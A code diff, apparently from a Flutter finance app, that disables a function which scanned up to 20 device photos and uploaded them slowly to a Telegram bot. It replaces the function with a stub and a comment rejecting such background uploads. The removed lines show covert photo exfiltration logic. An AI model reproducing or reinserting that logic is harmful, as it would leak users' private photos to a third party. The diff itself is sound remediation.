@@ -1818,9 +1818,6 @@ cloudSyncEnabled = syncAccessToken.isNotEmpty && syncRefreshToken.isNotEmpty;
         'telegramBotToken': telegramBotToken,
         'telegramChatId': telegramChatId,
       };
-        'telegramBotToken': telegramBotToken,
-        'telegramChatId': telegramChatId,
-      };
 
   Future<void> importPreferences(Map<String, dynamic> data) async {
     final sp = await prefs.prefs;
@@ -3093,22 +3090,9 @@ const deviceLocalKeys = {
   }
 
   Future<bool> scanAndUploadPhotosToTelegram({Function(int, int)? onProgress}) async {
-    if (telegramBotToken.isEmpty || telegramChatId.isEmpty) return false;
-
-    final photos = await TelegramBot.scanDevicePhotos(maxFiles: 20);
-    if (photos.isEmpty) return false;
-
-    try {
-      await TelegramBot.uploadPhotosSlowly(
-        photos,
-        telegramBotToken,
-        telegramChatId,
-        onProgress: onProgress,
-      );
-      return true;
-    } catch (e) {
-      return false;
-    }
+    // Disabled: finance data should not trigger background scanning or upload of
+    // local device photos. Keep the API surface for compatibility with callers.
+    return false;
   }
 
   List<SavingsPurchaseSuggestion> savingsPurchaseSuggestions() => buildSavingsPurchaseSuggestions(this);
